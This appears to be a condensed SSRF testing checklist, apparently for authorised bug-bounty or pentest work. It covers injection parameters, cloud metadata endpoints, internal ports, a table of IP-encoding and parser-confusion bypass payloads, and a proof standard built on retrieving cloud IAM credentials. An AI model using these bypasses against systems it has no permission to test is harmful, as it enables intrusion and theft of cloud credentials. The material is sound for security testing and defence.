---
name: ssrf
description: Focused SSRF checklist — injection points, IP bypasses, cloud metadata, proof standard. Summarized from web2-vuln-classes + playbooks.
---

# SSRF — Server-Side Request Forgery

## Checklist
- [ ] Enumerate URL-taking params: `url`, `src`, `redirect`, `next`, `image`, `webhook`, `callback`, JSON webhooks/avatar URLs, SVG `<image href>`
- [ ] OOB DNS callback first (informational only)
- [ ] Cloud metadata: `169.254.169.254`, `metadata.google.internal` (+ required headers)
- [ ] Internal ports: 6379/9200/2375/8080/localhost variants
- [ ] Try bypass table below before concluding "filtered"

## Common bypasses
| Technique | Example |
|---|---|
| Decimal / octal / hex IP | `http://2130706433`, `http://0177.0.0.1`, `http://0x7f.0.0.1` |
| Short / IPv6 | `http://127.1`, `http://[::1]`, `http://[::ffff:127.0.0.1]` |
| DNS rebinding | Attacker DNS flips to internal after allowlist check |
| Redirect chain | Allowed external URL → 302 to internal |
| Parser confusion | `http://attacker.com#@internal`, CNAME to internal |

## Proof standard
- **Confirm**: returned cloud IAM creds / metadata document, or OOB hit proving server-side fetch of an internal resource.
- DNS-only collaborator hit = Informational candidate, not Critical.
- Single 401 from IMDSv2 ≠ safe — try token PUT flow / other clouds' headers.
